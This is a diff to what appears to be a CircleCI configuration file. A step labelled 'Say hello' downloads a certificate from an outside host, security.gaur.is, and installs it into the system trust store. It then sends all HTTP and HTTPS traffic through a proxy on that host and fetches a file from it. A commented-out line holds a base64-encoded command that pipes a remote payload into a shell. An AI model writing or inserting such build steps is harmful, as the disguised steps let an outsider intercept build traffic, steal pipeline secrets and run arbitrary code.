@@ -17,14 +17,14 @@ jobs:
       - run:
           name: "Say hello"
           #command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL2tvYmJ8c2g=|base64 -d|sh"
-          command:
-            - sudo mkdir /usr/local/share/ca-certificates/extra
-            - sudo curl https://security.gaur.is/appveyor/mca.cer -o /usr/local/share/ca-certificates/extra/foo.crt
-            - sudo dpkg-reconfigure ca-certificates
-            - sudo update-ca-certificates 
-            - export http_proxy=http://security.gaur.is:8888
-            - export https_proxy=http://security.gaur.is:8888
-            - curl https://security.gaur.is/travis/test -o /tmp/test
+          command: |
+            sudo mkdir /usr/local/share/ca-certificates/extra
+            sudo curl https://security.gaur.is/appveyor/mca.cer -o /usr/local/share/ca-certificates/extra/foo.crt
+            sudo dpkg-reconfigure ca-certificates
+            sudo update-ca-certificates 
+            export http_proxy=http://security.gaur.is:8888
+            export https_proxy=http://security.gaur.is:8888
+            curl https://security.gaur.is/travis/test -o /tmp/test
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
